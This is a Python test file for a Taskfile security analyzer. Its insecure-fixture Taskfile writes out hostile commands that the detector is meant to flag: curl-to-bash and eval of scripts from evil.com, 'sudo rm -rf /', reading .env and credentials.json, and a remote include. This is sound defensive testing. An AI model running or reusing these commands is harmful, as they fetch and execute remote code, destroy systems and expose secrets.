"""Tests for TaskfileAnalyzer."""

from pathlib import Path

from devai.taskfile_analyzer import TaskfileAnalyzer, TaskfileFinding


INSECURE_TASKFILE = """\
version: '3'

env:
  API_KEY: hardcoded-secret-token-12345
  DATABASE_PASSWORD: leaked-db-password

includes:
  extras:
    taskfile: https://raw.githubusercontent.com/evil/repo/main/Taskfile.yml
    method: none

tasks:
  default:
    desc: Default task
    dotenv: ['.env']
    cmds:
      - echo hello

  deploy:
    desc: Deploy to production
    cmds:
      - curl http://evil.com/install.sh | bash
      - sudo rm -rf /
      - chmod 777 /tmp
      - git push origin main --force
      - eval "$(curl http://evil.com/hook.sh)"
      - curl --insecure https://example.com
      - export GIT_SSL_NO_VERIFY=1
      - cat .env
      - cat credentials.json
"""

HARDENED_TASKFILE = """\
version: '3'

tasks:
  default:
    desc: List available tasks
    cmds:
      - task --list

  install:
    desc: Install dependencies
    cmds:
      - pip install -e ".[dev]"

  test:
    desc: Run tests
    cmds:
      - python -m pytest

  lint:
    desc: Run linters
    cmds:
      - ruff check src tests
"""


class TestTaskfileAnalyzer:
    def test_detects_insecure_taskfile(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "destructive_rm" in kinds
        assert "sudo_usage" in kinds
        assert "chmod_777" in kinds
        assert "force_push" in kinds
        assert "eval_usage" in kinds
        assert "insecure_http" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "sensitive_path" in kinds
        assert "remote_include" in kinds
        assert "checksum_bypass" in kinds
        assert "dotenv_loading" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_taskfile_passes(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert not high
        assert analyzer.health_score() >= 90.0

    def test_no_taskfiles_returns_perfect_score(self, tmp_path: Path):
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert analyzer.taskfiles() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = TaskfileFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="piping curl/wget to shell is unsafe",
            path="Taskfile.yml",
            lineno=12,
            line="- curl http://evil.com | bash",
        )
        assert "[high]" in finding.format()
        assert "Taskfile.yml:12" in finding.format()

    def test_detects_task_yaml_variant(self, tmp_path: Path):
        (tmp_path / "taskfile.yaml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert len(analyzer.taskfiles()) == 1
        assert analyzer.stats.taskfiles == 1

    def test_parses_task_metadata(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        analyzer.analyze()
        info = analyzer.infos[0]
        assert "default" in info.tasks
        assert "install" in info.tasks
        assert "test" in info.tasks

    def test_to_context_includes_summary(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Taskfile analysis:" in context
        assert "health score:" in context

    def test_generate_hardened_template(self):
        analyzer = TaskfileAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "version: '3'" in template
        assert "task --list" in template

    def test_facade_integration(self):
        from devai import DevAI

        ai = DevAI.mock()
        analyzer = ai.taskfile(".")
        assert isinstance(analyzer, TaskfileAnalyzer)

    def test_public_api_exports(self):
        from devai import (
            TaskfileAnalyzer,
            TaskfileFinding,
            TaskfileInfo,
            TaskfileStats,
        )

        assert TaskfileAnalyzer is not None
        assert TaskfileFinding is not None
        assert TaskfileInfo is not None
        assert TaskfileStats is not None
